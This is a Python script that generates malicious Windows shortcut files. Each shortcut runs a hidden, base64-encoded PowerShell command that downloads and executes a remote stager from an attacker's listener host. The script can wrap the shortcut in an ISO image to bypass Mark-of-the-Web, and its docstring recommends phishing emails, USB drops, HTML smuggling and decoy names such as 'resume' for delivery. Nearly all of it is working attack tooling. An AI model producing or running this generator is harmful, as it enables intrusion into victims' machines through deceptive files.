#!/usr/bin/env python3
"""
gen_lnk.py — LNK (Windows shortcut) payload generator

LNK targets powershell.exe in %WINDIR% — allowed by AppLocker default
path rules. Optional ISO wrapping bypasses Mark-of-the-Web (MOTW) on
Windows < 11 22H2 (where ISO mounting doesn't propagate MOTW).

Usage:
  python3 gen_lnk.py -l 10.0.0.1 -p 8888 -o resume.lnk
  python3 gen_lnk.py -l 10.0.0.1 -p 8888 --iso -o resume.iso

Deliver:
  - USB drop / phishing email (attach ISO, user mounts, double-clicks LNK)
  - HTML smuggling download
  - SharePoint/OneDrive payload
"""

import argparse
import base64
import os
import struct
import subprocess


# ─── Minimal MS-SHLLINK binary builder ───────────────────────────

HEADER_SIZE = 0x4C
LINK_CLSID = bytes.fromhex("0114020000000000C000000000000046")
HAS_LINK_INFO = 0x00000002
HAS_ARGUMENTS = 0x00000020
IS_UNICODE    = 0x00000080


def _build_lnk(target_path: str, arguments: str) -> bytes:
    link_flags = HAS_LINK_INFO | HAS_ARGUMENTS | IS_UNICODE

    # Shell Link Header (76 bytes)
    header = (
        struct.pack("<I", HEADER_SIZE) +
        LINK_CLSID +
        struct.pack("<II", link_flags, 0x00000020) +   # LinkFlags, FileAttributes
        struct.pack("<QQQ", 0, 0, 0) +                 # Timestamps
        struct.pack("<III", 0, 0, 7) +                 # FileSize, IconIndex, ShowCommand(7=min-no-active)
        struct.pack("<HHII", 0, 0, 0, 0)               # HotKey, Reserved1,2,3
    )
    assert len(header) == HEADER_SIZE

    # LinkInfo: local volume + base path
    li_header_size = 0x1C
    vol_size = 0x10
    volume_id = struct.pack("<IIII",
        vol_size, 3, 0xABCD1234, vol_size)  # size, DRIVE_FIXED, serial, label_offset(past end)

    tgt_bytes = target_path.encode("ascii") + b"\x00"
    suffix    = b"\x00"

    vol_offset     = li_header_size
    path_offset    = li_header_size + vol_size
    suffix_offset  = path_offset + len(tgt_bytes)
    li_size        = li_header_size + vol_size + len(tgt_bytes) + len(suffix)

    link_info = (
        struct.pack("<IIIIIII",
            li_size, li_header_size,
            1,              # VolumeIDAndLocalBasePath
            vol_offset, path_offset,
            0,              # no network share
            suffix_offset) +
        volume_id + tgt_bytes + suffix
    )
    # Pad to 4-byte boundary
    link_info += b"\x00" * ((4 - len(link_info) % 4) % 4)

    # StringData: Arguments (CountCharacters + UTF-16LE)
    args_wide   = arguments.encode("utf-16-le")
    string_data = struct.pack("<H", len(arguments)) + args_wide

    return header + link_info + string_data


def generate(stager_url: str, output_path: str = "resume.lnk",
             wrap_iso: bool = False) -> bool:
    target    = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    ps_cmd    = f"IEX(New-Object Net.WebClient).DownloadString('{stager_url}')"
    ps_enc    = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
    arguments = f"-NoP -NonI -W Hidden -Enc {ps_enc}"

    lnk_path  = output_path if not wrap_iso else output_path.rsplit(".", 1)[0] + ".lnk"
    lnk_bytes = _build_lnk(target, arguments)

    with open(lnk_path, "wb") as f:
        f.write(lnk_bytes)
    print(f"[+] LNK: {lnk_path} ({len(lnk_bytes)} bytes)")

    if wrap_iso:
        iso_path = output_path if output_path.endswith(".iso") else output_path.rsplit(".", 1)[0] + ".iso"
        if _make_iso(lnk_path, iso_path):
            print(f"[+] ISO: {iso_path} — MOTW bypassed on Windows < 11 22H2")
        else:
            print("[!] ISO failed — genisoimage/mkisofs not installed, LNK written only")

    return True


def _make_iso(lnk_path: str, iso_path: str) -> bool:
    for tool in ("genisoimage", "mkisofs"):
        try:
            r = subprocess.run(
                [tool, "-o", iso_path, "-J", "-R", lnk_path],
                capture_output=True, timeout=30)
            if r.returncode == 0 and os.path.getsize(iso_path) > 0:
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return False


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="LNK shortcut payload generator")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--stager-url", help="Full URL to stager.ps1")
    g.add_argument("-l", "--lhost", help="Listener host")
    p.add_argument("-p", "--port",        type=int, default=8888)
    p.add_argument("--stager-name",       default="stager.ps1")
    p.add_argument("--iso", action="store_true", help="Wrap in ISO (MOTW bypass)")
    p.add_argument("-o", "--output",      default="resume.lnk")
    args = p.parse_args()

    url = args.stager_url or f"http://{args.lhost}:{args.port}/{args.stager_name}"
    generate(url, args.output, args.iso)
